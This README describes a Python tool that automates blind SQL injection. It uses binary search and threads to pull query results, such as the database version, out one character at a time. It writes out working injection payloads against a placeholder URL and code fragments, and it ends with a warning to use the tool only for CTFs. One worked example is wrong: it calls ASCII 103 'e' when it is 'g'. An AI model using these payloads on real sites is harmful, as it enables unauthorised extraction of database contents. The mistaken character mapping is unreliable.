# Blindary-Search
Binary Search implemented for Blind SQL data exfiltration

The script first runs Binary Search to gets the length of the sub-query using `length(({sql}))`

You need to enter the Success String, which is the string that appears on the webpage if the query returns a `True` or `False`

```
http://url?q=a' or length((select @@version))<100; -- - 

http://url?q=a' or length((select @@version))<50; -- - 

http://url?q=a' or length((select @@version))<25; -- - 

...
```

Once we have the length of the string, we create an empty array of that size 

```
 answer = [0] * ans_len
```

For each character, we spawn a thread that does Binary Search to find what the correct character is. The number of threads is defined by `CHUNK_SIZE`

For example, finding the character at the 14th position on the string in the ascii character range of 32-127

```
http://url?q=a' or ascii(substr((select @@version),14,1))<96; -- -
http://url?q=a' or ascii(substr((select @@version),14,1))<47; -- -
http://url?q=a' or ascii(substr((select @@version),14,1))<71; -- -
```

Once it finds the correct ascii value of the character, in this example it's 103 (71th position in the range of 32-127) so it's `e` , the character is appeneded to the array

We need to take `pos-1` because python arrays are zero indexed while `substr()` in SQL in not.

```
global answer
answer[pos-1] = chr(char)
```

# WARNING
Please don't DDoS a service using this to spawn multiple threads against it. Use this only for CTFs!
